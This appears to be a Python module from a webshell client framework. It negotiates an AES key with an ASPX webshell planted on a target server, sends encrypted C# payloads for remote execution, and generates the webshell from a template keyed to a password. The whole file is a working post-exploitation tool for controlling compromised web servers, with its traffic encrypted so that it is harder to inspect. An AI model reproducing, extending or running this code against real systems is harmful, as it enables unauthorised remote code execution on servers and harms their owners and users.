from api.webshell import Webshell, WebshellSession, CodeExecuteError, CSharpWebshell, EvalResult
from api import logger, utils, CSharpPayload, Request, HttpException
import random
import re
import os
import base64
import json
import string
import hashlib
try:
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    import cryptography.hazmat.primitives.padding as pad
    from cryptography.hazmat.primitives import serialization, hashes
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
except ModuleNotFoundError as e:
    logger.warning(f"No module `cryptography`, webshell `{__name__}` maybe not available!")
    raise SystemExit(0)

class DecryptFailedError(Exception):
    pass
class EncryptFailedError(Exception):
    pass

class webshell(CSharpWebshell):
    
    def __init__(self):
        super().__init__()

        self.options.add_option('password', 'You need use this password to connect webshell server.', True, 'c', check=r'[\w\-]+')

        self.opener = None

        self.aes = None # 用于aes加密传输的aes对象

    def _create_key(self, key: bytes=None):
        '''创建秘钥，并填充当前的秘钥对象
        '''
        if key is None:
            key = os.urandom(32)
        iv = key[:16]
        self.aes = Cipher(algorithms.AES(key), modes.CBC(iv))

    def _encrypt(self, data:bytes)-> bytes:
        if not data:
            return b''
        try:
            enc = self.aes.encryptor()
            padder = pad.PKCS7(128).padder()
            padded_data = padder.update(data) + padder.finalize()
            return enc.update(padded_data)+enc.finalize()
        except Exception as e:
            raise EncryptFailedError(e)

    def _decrypt(self, data: bytes)-> bytes:
        if not data:
            return b''
        try:
            dec = self.aes.decryptor()
            unpadder = pad.PKCS7(128).unpadder()
            content = dec.update(data)+dec.finalize()
            return unpadder.update(content)+unpadder.finalize()
        except Exception as e:
            raise DecryptFailedError(e)

    def connect(self)-> bool:
        '''connect target and return True, or False if connect failed. 
        '''
        self.opener = Request()
        self._create_key()
        key = self.aes.algorithm.key
        
        pwd = hashlib.sha256(self.options.password.encode()).hexdigest()[:16].encode()
        self._create_key(pwd)
        data = base64.b64encode(self._encrypt(key))
        try:
            with self.opener.post(self.options.target, data, timeout=10) as f:
                ret = f.read()
        except BaseException as e:
            logger.error(e)
            return False
        if ret.strip() != base64.b64encode(key):
            logger.error(f"The accepted number `{ret.decode(self.options.encoding, 'ignore')}` does not match the expected `{base64.b64encode(key).decode()}`")
            return False

        self._create_key(key)
        return True

    @Webshell.handle_evaled
    def eval(self, payload: CSharpPayload)-> EvalResult:
        '''执行payload并获取返回结果'''
        payload = self._encrypt(payload.code)
        payload = base64.b64encode(payload)
        headers = {}
        if self.options.extra_assemblys:
            headers['Token'] = base64.b64encode(self._encrypt(self._generate_extra_assemblys_string().encode())).decode()
        result = EvalResult()
        try:
            with self.opener.post(self.options.target, payload, timeout=self.options.timeout, headers=headers) as f:
                data = f.read()
                data = base64.b64decode(data)
                data = self._decrypt(data)
                data = json.loads(data)
                if not self._error_handler(data, result):
                    return result
                data = base64.b64decode(data['data'].encode()).decode(self.options.encoding, 'ignore')
                result.data = data
                return result
        except (EncryptFailedError, DecryptFailedError) as e:
            err = self.EvalError(e.__class__.__name__, str(e), False, False)
            result.add_error_info(err)
            if self.options.verbose > 0:
                logger.error(err)
                print(f"Error data: {data[:100]}")
        except HttpException as e:
            err = self.EvalError('HttpException', f"{e.msg};Response: {e.response.read().decode(self.options.encoding, 'ignore')}", False, False)
            result.add_error_info(err)
            if self.options.verbose > 1:
                logger.error(err)
        except BaseException as e:
            err = self.EvalError(e.__class__.__name__, str(e), False, False)
            result.add_error_info(err)
            if self.options.verbose > 0:
                logger.error(err)

        return result

    def _error_handler(self, error: dict, result: EvalResult)-> bool:
        '''处理webshell返回的错误信息
        '''
        if error['code'] != 1:
            for msg in error['msg']:
                err = self.EvalError(msg[0], base64.b64decode(msg[1].encode()).decode(self.options.encoding, 'ignore'), 
                    True if error['code'] == 0 or msg[2] else False, True)
                result.add_error_info(err)
                if err.iswarning and self.options.verbose > 1:
                    logger.warning(err)
                elif not err.iswarning and self.options.verbose > 0:
                    logger.error(err)
            if error['code'] == -1:
                return False
        return True

    def generate(self)-> bytes:
        '''生成并返回webshell代码'''
        self._create_key()
        code = ''
        path = os.path.join(os.path.dirname(__file__), "templete.aspx")
        with open(path, 'rb') as f:
            code = f.read().decode()
        pwd = hashlib.sha256(self.options.password.encode()).hexdigest()
        code = utils.templete_0(code, pwd=pwd[:16])
        return code.encode()

